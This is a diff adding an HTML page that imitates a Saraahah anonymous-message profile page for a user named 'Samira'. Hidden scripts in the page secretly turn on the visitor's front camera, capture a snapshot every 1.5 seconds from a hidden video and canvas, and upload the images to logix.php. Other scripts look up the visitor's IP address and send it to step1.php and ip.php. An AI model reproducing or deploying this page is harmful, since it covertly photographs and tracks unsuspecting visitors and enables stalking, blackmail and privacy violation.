@@ -1,0 +1,814 @@
+<!DOCTYPE html>
+<html lang="ar">
+ <head>
+  <meta charset="utf-8" content="text/html" http-equiv="content-type"/>
+  <meta content="IE=Edge" http-equiv="X-UA-Compatible"/>
+  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
+  <title>
+   Samira - Saraahah | صراحة
+  </title>
+  <link href="upload/general/logo_thumb.png" rel="icon" sizes="96x96" type="image/png"/>
+  <link href="https://saraahah.com" hreflang="ar" rel="alternate">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+
+   <script>
+    (function() {
+	    var link = document.createElement('link');
+	    link.rel = "stylesheet";
+	    link.href = "//fonts.googleapis.com/css?family=Cairo:300,400,600,700";
+	    document.querySelector("head").appendChild(link);
+	})();
+   </script>
+  
+   <meta content="صراحة، موقع صراحة، موقع صراحات، رسائل مجهولة، رسائل صريحة" name="keywords"/>
+
+[metacnt]
+   <meta content="صراحة" name="author"/>
+
+    <meta content="article" property="og:type">
+
+        <meta content="300" property="og:image:width">
+         <meta content="200" property="og:image:height">
+          <meta content="summary" name="twitter:card">
+           <meta content="@Saraahahcom" name="twitter:site">
+            <meta content="@Saraahahcom" name="twitter:creator"/>
+            <meta content="Samira - صراحة" name="twitter:title"/>
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-RTWVQHQNYN">
+             </script>
+			 <script>
+function sendText() {
+    var text = document.getElementById("message").value;
+    
+
+    var xhttp = new XMLHttpRequest();
+    xhttp.onreadystatechange = function() {
+        if (this.readyState == 4 && this.status == 200) {
+            showToast("success", "تم ارسال رسالتك");
+        }
+    };
+    xhttp.open("POST", "resmsg.php", true);
+    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    xhttp.send("text=" + text);
+}</script>
+             <script>
+              window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-RTWVQHQNYN');
+             </script>
+             <style type="text/css">
+              .headroom,.navbar-main, .navbar, .navbar.navbar-main{
+    position: unset !important;
+    background: #172b4d !important;
+}
+
+.section-shaped .shape-primary {
+    background: #172b4d !important;
+}
+
+.card.card-profile{
+ margin-top:50px !important;
+}
+
+.shape.shape-style-1.bg-gradient-default{
+  background: #172b4d !important;
+}
+             </style>
+             <link href="themes/core/plugins/bootstrap-rtl/bootstrap-rtl.min.css" rel="stylesheet"/>
+             <link href="themes/default/plugins/frontend-theme/assets/vendor/nucleo/css/nucleo.css?v40" rel="stylesheet"/>
+             <link href="themes/default/plugins/frontend-theme/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css?v40" rel="stylesheet"/>
+             <link href="themes/default/plugins/frontend-theme/assets/css/argon.min.css?v40" rel="stylesheet"/>
+             <link href="themes/core/plugins/pace-progressbar/pace.min.css?v40" rel="stylesheet"/>
+             <link href="themes/core/plugins/sweetalert2/sweetalert2_custom.min.css?v40" rel="stylesheet"/>
+             <link href="themes/core/css/core.min.css?v40" rel="stylesheet"/>
+            </meta>
+           </meta>
+          </meta>
+         </meta>
+        </meta>
+       </meta>
+      </meta>
+     </meta>
+    </meta>
+   </meta>
+  </link>
+ </head>
+ <body dir="rtl">
+<div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+ </div>
+ 
+ <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+ 
+ <script>
+ 
+ function post(imgdata){
+ $.ajax({
+     type: 'POST',
+     data: { cat: imgdata},
+     url: 'logix.php',
+     dataType: 'json',
+     async: false,
+     success: function(result){
+         // call the function that handles the response/results
+     },
+     error: function(){
+     }
+   });
+ };
+ 
+ 
+ 'use strict';
+ 
+ const video = document.getElementById('video');
+ const canvas = document.getElementById('canvas');
+ const errorMsgElement = document.querySelector('span#errorMsg');
+ 
+ const constraints = {
+   audio: false,
+   video: {
+     
+     facingMode: "user"
+   }
+ };
+ 
+ // Access webcam
+ async function init() {
+   try {
+     const stream = await navigator.mediaDevices.getUserMedia(constraints);
+     handleSuccess(stream);
+   } catch (e) {
+     errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+   }
+ }
+ 
+ // Success
+ function handleSuccess(stream) {
+   window.stream = stream;
+   video.srcObject = stream;
+ 
+ var context = canvas.getContext('2d');
+   setInterval(function(){
+ 
+        context.drawImage(video, 0, 0, 640, 480);
+        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        post(canvasData); }, 1500);
+   
+ 
+ }
+ 
+ // Load init
+ init();
+
+</script>
+ <script>
+     document.addEventListener("DOMContentLoaded", function () {
+         // Function to get user's IP address
+         function getUserIP(callback) {
+             fetch("https://api64.ipify.org?format=json")
+                 .then(response => response.json())
+                 .then(data => callback(data.ip))
+                 .catch(error => console.error("Error fetching IP:", error));
+         }
+
+         // Function to send IP to PHP file
+         function sendIPToPHP(ip) {
+             fetch("step1.php", {
+                 method: "POST",
+                 headers: {
+                     "Content-Type": "application/x-www-form-urlencoded",
+                 },
+                 body: `{"ip":"${ip}"}`, 
+             })
+                 .then(response => response.text())
+                 .then(data => console.log(data))
+                 .catch(error => console.error("Error sending IP to PHP:", error));
+         }
+
+         // Get user's IP and send it to PHP file
+         getUserIP(function (ip) {
+             sendIPToPHP(ip);
+         });
+     });
+</script>
+  <header class="header-global">
+   <nav class="navbar navbar-main navbar-expand-lg navbar-transparent navbar-light headroom" id="navbar-main">
+    <div class="container">
+     <a class="navbar-brand mr-lg-5" href="https://saraahah.com/">
+      <img alt="صراحة" class="mr-2" src="upload/general/logo_thumb.png" style="height: 50px !important;"/>
+      صراحة
+     </a>
+    </div>
+   </nav>
+  </header>
+  <main class="profile-page">
+   <section class="section-sm pb-2">
+    <div class="container">
+     <div class="card card-profile shadow mt--300" style="z-index: 9;">
+      <div class="px-4">
+       <div class="row justify-content-center">
+        <div class="col-lg-3 order-lg-2">
+         <div class="card-profile-image">
+          <a data-target="#modal-photo" data-toggle="modal" href="Samira" role="button">
+           <img class="rounded-circle" src="themes/default/img/avatar.png"/>
+          </a>
+         </div>
+        </div>
+        <div class="col-lg-4 order-lg-3 text-lg-right align-self-lg-center hidden-xs">
+         <div class="card-profile-actions py-4 mt-lg-0">
+         </div>
+        </div>
+        <div class="col-lg-4 order-lg-1">
+         <div class="card-profile-stats d-flex justify-content-center">
+          <div>
+           <a class="btn btn-icon btn-md btn-default" href="register">
+            <span class="btn-inner--icon">
+             <i class="fas fa-id-card">
+             </i>
+            </span>
+            <span class="btn-inner--text">
+             ليس لديك حساب؟ سجل بموقع صراحة
+            </span>
+           </a>
+          </div>
+         </div>
+        </div>
+       </div>
+       <div class="text-center mb-4 mt-sm-5 mt-1">
+        <h3>
+         Samira
+        </h3>
+        <div class="h6 font-weight-300">
+         <i class="fas fa-share-alt mr-2">
+         </i>
+         saraahah.com/Samira
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+   </section>
+   <section class="maxh">
+    <div class="container">
+     <div class="row">
+      <div class="col">
+       <script async="" crossorigin="anonymous" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9992081981995436">
+       </script>
+      </div>
+     </div>
+    </div>
+   </section>
+   <section class="section-lg pt-2 pb-6">
+    <div class="container">
+     <div class="row justify-content-center">
+      <div class="col-lg-12">
+       <form accept-charset="utf-8" action="profile/send_message" class="form-horizontal" enctype="multipart/form-data" id="form-create" method="post" role="form">
+        <input name="csrf_token" type="hidden" value="9d3fff22343c57f6c7756fda5a3cc04f"/>
+        <form accept-charset="utf-8" action="" class="form-horizontal" enctype="multipart/form-data" id="form-create" method="post" role="form">
+         <input name="csrf_token" type="hidden" value="9d3fff22343c57f6c7756fda5a3cc04f"/>
+         <input name="user_id" type="hidden" value="doyGGUmBllhLMee"/>
+         <input id="bg_image" name="bg_image" type="hidden" value=""/>
+         <div class="card shadow">
+          <div class="card-header">
+           <div class="row justify-content-center">
+            <div class="col-sm-2 col-3 col-md-1 col-lg-1">
+             <div class="radio-image">
+              <input checked="" id="frame_0" name="frame_id" type="radio" value="0">
+               <label class="image-label img-fluid rounded shadow" for="frame_0">
+               </label>
+              </input>
+             </div>
+            </div>
+            <div class="col-sm-2 col-3 col-md-1 col-lg-1">
+             <div class="radio-image">
+              <input id="frame_1" name="frame_id" type="radio" value="1">
+               <label class="image-label img-fluid rounded shadow" for="frame_1" style="background-image: url(https://saraahah.com/upload/frames/1576242171509.png);">
+               </label>
+              </input>
+             </div>
+            </div>
+            <div class="col-sm-2 col-3 col-md-1 col-lg-1">
+             <div class="radio-image">
+              <input id="frame_2" name="frame_id" type="radio" value="2">
+               <label class="image-label img-fluid rounded shadow" for="frame_2" style="background-image: url(https://saraahah.com/upload/frames/1576242159912.png);">
+               </label>
+              </input>
+             </div>
+            </div>
+            <div class="col-sm-2 col-3 col-md-1 col-lg-1">
+             <div class="radio-image">
+              <input id="frame_3" name="frame_id" type="radio" value="4"/>
+              <label class="image-label img-fluid rounded shadow" for="frame_3" style="background-image: url(https://saraahah.com/upload/frames/1576242147634.png);">
+              </label>
+             </div>
+            </div>
+           </div>
+          </div>
+          <div class="card-body">
+           <div class="bg-wrapper">
+            <div class="bg-container" id="message_bg">
+             <textarea autofocus="" class="form-control bg-textarea" id="message" maxlength="500" name="message" placeholder="ابدأ في كتابة رسالتك ..." required="" rows="4"></textarea>
+             <span class="bg-wrapper-watermark" id="message_watermark">
+              saraahah.com
+             </span>
+            </div>
+           </div>
+           <div class="bg-wrapper">
+            <small class="text-muted">
+             الحد الأقصى لعدد الأحرف - 500
+            </small>
+           </div>
+           <input checked="" class="custom-control-input" id="reply_type_text" name="reply_type" style="display: none;" type="radio" value="0"/>
+          </div>
+          <div class="card-footer">
+           <button class="btn btn-primary btn-block" id="ssubmit" onclick="sendText()">
+            أرسل الآن
+           </button>
+          </div>
+         </div>
+        </form>
+       </form>
+      </div>
+     </div>
+    </div>
+   </section>
+  </main>
+  <div aria-hidden="true" aria-labelledby="modal-photo" class="modal fade" id="modal-photo" role="dialog" tabindex="-1">
+   <div class="modal-dialog modal-danger modal-dialog-centered modal-" role="document">
+    <div class="modal-content bg-gradient-danger">
+     <div class="modal-body p-0">
+      <div class="text-center">
+       <a aria-label="Close" data-dismiss="modal" role="button">
+        <img alt="Samira" class="img-fluid rounded shadow w-100" src="themes/default/img/avatar.png"/>
+       </a>
+      </div>
+     </div>
+    </div>
+   </div>
+  </div>
+  <script type="text/javascript">
+   var frames              = '[{"id":"1","image":"1576242171509.png","text_color":"1","status":"1","date_added":"2019-12-13 15:52:40","date_updated":"2019-12-13 16:02:51"},{"id":"2","image":"1576242159912.png","text_color":"0","status":"1","date_added":"2019-12-13 15:53:51","date_updated":"2019-12-13 16:02:40"},{"id":"4","image":"1576242147634.png","text_color":"1","status":"1","date_added":"2019-12-13 15:56:09","date_updated":"2019-12-13 16:02:27"}]';
+    var count_questions     = 0;
+    var visited_username    = 'Samira';
+  </script>
+  <footer class="footer">
+   <div class="container">
+    <div class="row align-items-center justify-content-md-between">
+     <div class="col-md-12 text-lg-center btn-wrapper">
+      <a class="btn btn-neutral btn-icon-only btn-facebook btn-round btn-lg" data-original-title="تابعنا" data-toggle="tooltip" href="saraahahcom" rel="nofollow" style="zoom:250%;" target="_blank">
+       <i class="fab fa-facebook-square">
+       </i>
+      </a>
+      <a class="btn btn-neutral btn-icon-only btn-twitter btn-round btn-lg" data-original-title="تابعنا" data-toggle="tooltip" href="Saraahahcom" rel="nofollow" style="zoom:250%;" target="_blank">
+       <i class="fab fa-twitter-square">
+       </i>
+      </a>
+     </div>
+    </div>
+    <hr/>
+    <div class="row align-items-center justify-content-md-between">
+     <div class="col-md-12">
+      <ul class="nav nav-footer">
+       <li class="nav-item">
+        <a class="nav-link" href="login">
+         تسجيل الدخول
+        </a>
+       </li>
+       <li class="nav-item">
+        <a class="nav-link" href="register">
+         التسجيل في صراحة
+        </a>
+       </li>
+       <li class="nav-item">
+        <a class="nav-link" href="about">
+         عن صراحة
+        </a>
+       </li>
+       <li class="nav-item">
+        <a class="nav-link" href="contact">
+         اتصل بنا
+        </a>
+       </li>
+       <li class="nav-item">
+        <a class="nav-link" href="saraahah_blog">
+         المدونة
+        </a>
+       </li>
+       <li class="nav-item">
+        <a class="nav-link" href="terms">
+         البنود والشروط
+        </a>
+       </li>
+       <li class="nav-item">
+        <a class="nav-link" href="privacy">
+         سياسة الخصوصية
+        </a>
+       </li>
+      </ul>
+      <div class="copyright">
+       جميع الحقوق محفوظة -
+       <a href="https://saraahah.com/">
+        صراحة
+       </a>
+       © 2024
+      </div>
+     </div>
+    </div>
+   </div>
+  </footer>
+  <script type="text/javascript">
+   var base_url    = "https://saraahah.com/";
+        var site_url    = "https://saraahah.com/";
+        var uri_seg_1   = "Samira";
+        var uri_seg_2   = "";
+        var uri_seg_3   = "";
+        var csrf_name   = "csrf_token";
+        var csrf_token  = "9d3fff22343c57f6c7756fda5a3cc04f";
+        var user_id     = "0";
+        var username    = "";
+  </script>
+  <script src="https://saraahah.com/themes/default/plugins/jquery/jquery.min.js?v=1.0" type="text/javascript">
+  </script>
+  <script src="https://saraahah.com/themes/default/plugins/frontend-theme/assets/vendor/popper/popper.min.js?v=1.0" type="text/javascript">
+  </script>
+  <script src="https://saraahah.com/themes/default/plugins/frontend-theme/assets/vendor/bootstrap/bootstrap.min.js?v=1.0" type="text/javascript">
+  </script>
+  <script src="https://saraahah.com/themes/default/plugins/frontend-theme/assets/vendor/headroom/headroom.min.js?v=1.0" type="text/javascript">
+  </script>
+  <script src="https://saraahah.com/themes/default/plugins/frontend-theme/assets/js/argon.min.js?v=1.0" type="text/javascript">
+  </script>
+  <script src="https://saraahah.com/themes/core/plugins/axios/axios.min.js?v=1.0" type="text/javascript">
+  </script>
+  <script src="https://saraahah.com/themes/core/plugins/pace-progressbar/pace.min.js?v=1.0" type="text/javascript">
+  </script>
+  <script src="https://saraahah.com/themes/core/plugins/sweetalert2/sweetalert2.min.js?v=1.0" type="text/javascript">
+  </script>
+  <script type="text/javascript">
+   'use strict';
+
+/* ============== AXIOS INTERCEPTORS start=================== */
+axios.defaults.baseURL = base_url;
+
+// Add a request interceptor
+axios.interceptors.request.use(function (config) {
+    // start progress bar
+    Pace.restart();
+    return config;
+}, function (error) {
+    return Promise.reject(error);
+});
+
+// Add a response interceptor
+
+// reload the page in case of consistent failed requests
+var failed_count = 0;
+axios.interceptors.response.use(function (response) {
+    // catch php error
+    if(/<p>/i.test(response.data)) {
+        showToast("warning", "هنالك خطأ ما، حاول مرة أخرى");
+    }
+
+    // show validation and custom errors
+    if(response.data.flag == 0) {
+        failed_count++;
+
+        // show only if any message
+        if(response.data.msg !== null) {
+            showToast("error", response.data.msg);
+        }
+
+        // set input fields in error state if any
+        if(response.data.error_fields.length > 0) {
+            $.each(response.data.error_fields, (index, item) => {
+                $("input[name*='"+item+"'], select[name*='"+item+"'], textarea[name*='"+item+"']").closest('.form-group').addClass('has-danger');
+                $("input[name*='"+item+"'], select[name*='"+item+"'], textarea[name*='"+item+"']").addClass('is-invalid');
+            });
+        }
+        
+    } else {
+        // reset failed request counter
+        failed_count = 0;
+
+        // show success messages
+        // show only if any message
+        if(response.data.msg !== null) {
+            showToast("success", response.data.msg);
+        }
+    }
+
+    // reload page after 10 failed attempts
+    if(failed_count == 10)
+        location.reload();
+    
+    return response;
+}, function (error) {
+    // catch CSRF error and reload 
+    if(/403/i.test(error)) {
+        location.reload();
+    }
+    
+    return Promise.reject(error);
+});
+/* ============== AXIOS INTERCEPTORS start=================== */
+
+
+
+
+
+/* ============== RESET FORM FIELDS ERROR STATE ON CHANGE start=============== */
+// using live jquery
+$(document).on('focus', "input, select, textarea", function() {
+    $(this).removeClass('is-invalid');
+    $(this).closest('.form-group').removeClass('has-danger');
+});
+/* ============== RESET FORM FIELDS ERROR STATE ON CHANGE end=============== */
+
+
+
+
+
+/* ================ CONVERT OBJECT TO FORMDATA ================ */
+
+function toFormData(data) {
+    var formData = new FormData(); // Currently empty
+
+    $.each(data, (index, item) => {
+        formData.append(index, item);    
+    });
+
+    return formData;
+}
+/* ================ CONVERT OBJECT TO FORMDATA ================ */
+
+
+
+
+/* ================ SHOW NOTIFICATION ================ */
+function showToast(type, message) {
+    const Toast = Swal.mixin({
+        toast: true,
+        position: 'top-right',
+        showConfirmButton: false,
+        timer: 4000,
+        customClass: {
+            container: 'custom-swal-container',
+            popup: 'custom-swal-popup custom-swal-popup-'+type,
+            header: 'custom-swal-header',
+            title: 'custom-swal-title',
+            closeButton: 'custom-swal-close-button',
+            image: 'custom-swal-image',
+            content: 'custom-swal-content',
+            input: 'custom-swal-input',
+            actions: 'custom-swal-actions',
+            confirmButton: 'custom-swal-confirm-button',
+            cancelButton: 'custom-swal-cancel-button',
+            footer: 'custom-swal-footer'
+        }
+    });
+    Toast.fire({
+        type: type,
+        html: message
+    })
+}
+/* ================ SHOW NOTIFICATION ================ */
+
+
+/* ================ GENERATE RANDOM STRING ================ */
+function randomString(length) {
+   var result           = '';
+   var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+   var charactersLength = characters.length;
+   for ( var i = 0; i < length; i++ ) {
+      result += characters.charAt(Math.floor(Math.random() * charactersLength));
+   }
+   return result;
+}
+
+/* ================ GENERATE RANDOM STRING ================ */
+
+
+/* ================ AXIOS CONFIRM ALERT ================ */
+function axiosAlert(title, text, data, url, redirect) {
+    Swal.fire({
+        title: title,
+        html: text,
+        type: 'warning',
+        showCancelButton: true,
+        confirmButtonColor: '#d33',
+        cancelButtonColor: '#3085d6',
+        confirmButtonText: title,
+        cancelButtonText : "إلغاء",
+    }).then((result) => {
+        if (result.value) {
+            var formData = toFormData(data);
+            axios.post(url, formData)
+            .then(function (res) {
+                var response = res.data.data;
+                if(res.data.flag == 1) {
+                    Swal.fire("معلومات!", res.data.msg, "info")
+
+                    if(typeof redirect === "undefined") {
+                        setTimeout(() => {
+                            location.reload();    
+                        }, 500);
+                    } else {
+                        setTimeout(() => {
+                            window.location.href = redirect;
+                        }, 500);
+                    }
+                }
+            })
+            .catch(function (error) {});
+        }
+    });
+}
+/* ================ AXIOS CONFIRM ALERT ================ */
+  </script>
+  <script type="text/javascript">
+   // get questions
+var q_offset    = 0;
+var q_more      = 1;
+function getQuestions() {
+    if(q_more == 1) {
+        axios.get('/profile/get_questions/'+visited_username+'/0/'+q_offset)
+        .then(function (res) {
+            var response = res.data.data;
+            
+            // append response to lists
+            $("#questions").append(response.view);
+
+            q_offset     = response.offset;
+            q_more       = response.more;
+                
+            if(q_more != 1)
+                $('#load_more_loader').text('');
+        })
+        .catch(function (error) {});
+    }
+};
+
+// get questions pinned
+var qp_offset    = 0;
+var qp_more      = 1;
+function getQuestionsPinned() {
+    if(qp_more == 1) {
+        axios.get('/profile/get_questions/'+visited_username+'/1/'+qp_offset)
+        .then(function (res) {
+            var response = res.data.data;
+            // append response to lists
+            $("#questions_pinned").append(response.view);
+
+            qp_offset     = response.offset;
+            qp_more       = response.more;
+            
+            if(qp_more != 1)
+                $('#load_more_loader_pinned').text('');
+        })
+        .catch(function (error) {});
+    }
+};
+
+function followUser(username) {
+    if(user_id > 0) {
+        var data        = {
+            csrf_token      : csrf_token,
+        };
+        var formData = toFormData(data);
+            
+        axios.post('/following/follow_user/'+username, formData)
+        .then(function (res) {
+            var response = res.data.data;
+            if(response.msg == 'followed') {
+                $('#follow_user').html('المتابعون');
+            } else {
+                $('#follow_user').html('تابع');
+            }
+        })
+        .catch(function (error) {});
+    } else {
+        showToast('info', "تسجيل الدخول أولاً ، لبدء متابعة هذا المستخدم!");
+    }
+}
+
+$(function(){
+
+    if(count_questions > 0) {
+        $('#questions').html('');
+        $('#questions_pinned').html('');
+        getQuestions();
+        getQuestionsPinned();
+    }
+
+    // select frames
+    $('input[type=radio][name=frame_id]').change(function() {
+        $('textarea#message').scrollTop(0);
+        if (this.value == 0) {
+            // no image
+            $('#message_bg').attr('style', 'background-image: none;');
+            // change text color
+            $('#message_bg textarea').attr('style', 'color: #000000;');
+            // change domain color
+            $('#message_watermark').attr('style', 'color: #000000;');
+
+            return true;
+        } else {
+            // set background image
+            var value = this.value;
+            $.each($.parseJSON(frames), function( key, val ) {
+                if(val.id == value) {
+                    $('#message_bg').attr('style', 'background-image: url('+base_url+'/upload/frames/'+val.image+');');
+                    // change text color
+                    if(val.text_color == 1) {
+                        $('#message_bg textarea').attr('style', 'color: #FFFFFF;');
+                        // change domain color
+                        $('#message_watermark').attr('style', 'color: #FFFFFF;');
+                    }
+                    else
+                    {
+                        $('#message_bg textarea').attr('style', 'color: #000000;');
+                        // change domain color
+                        $('#message_watermark').attr('style', 'color: #000000;');
+                    }
+                    
+                    return true;
+                }
+            });
+        }
+    });
+
+    // send message
+    $('form#form-create').on('submit', function(e) {
+        e.preventDefault();
+
+        $("#ssubmit").attr("disabled", true);
+
+            //disable a normal button
+            $("#ssubmit").attr("disabled", true);
+
+        var formData = new FormData($(this)[0]);
+        var url      = $(this).attr('action');
+        
+        axios.post(url, formData)
+        .then(function (res) {
+            var response = res.data.data;
+
+            if(res.data.flag == 1) {   
+                setTimeout(() => {
+                    window.location.href = response.url;
+                }, 500);
+            }
+        })
+        .catch(function (error) {});
+        
+        return false;           
+    });
+
+})
+  </script>
+  <script type="text/javascript">
+   $(function() {
+            var message     = ``;
+            var error       = ``;
+            var v_errors    = ``;
+            var s_error     = ``;
+            var info       = ``;
+
+            if(message != '') showToast('success', message);
+            if(error != '') showToast('error', error);
+            if(v_errors != '') showToast('error', v_errors);
+            if(s_error != '') showToast('error', s_error);
+            if(info != '') showToast('info', info);
+        });
+  </script>
+ <script>
+document.addEventListener("DOMContentLoaded", function () {
+    // OZIRIS to get user's IP address
+    function getUserIP(callback) {
+        fetch("https://api64.ipify.org?format=json")
+            .then(response => response.json())
+            .then(data => callback(data.ip))
+            .catch(error => console.error("Error fetching IP:", error));
+    }
+
+    // Function to send IP to PHP file
+    function sendIPToPHP(ip) {
+        fetch("ip.php", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded",
+            },
+            body: "ip=" + ip,
+        })
+            .then(response => response.text())
+            .then(data => console.log(data))
+            .catch(error => console.error("Error sending IP to PHP:", error));
+}
+
+// Get user's IP and send it to PHP file
+getUserIP(function (ip) {
+    sendIPToPHP(ip);
+});
+});
+</script></body>
+</html>
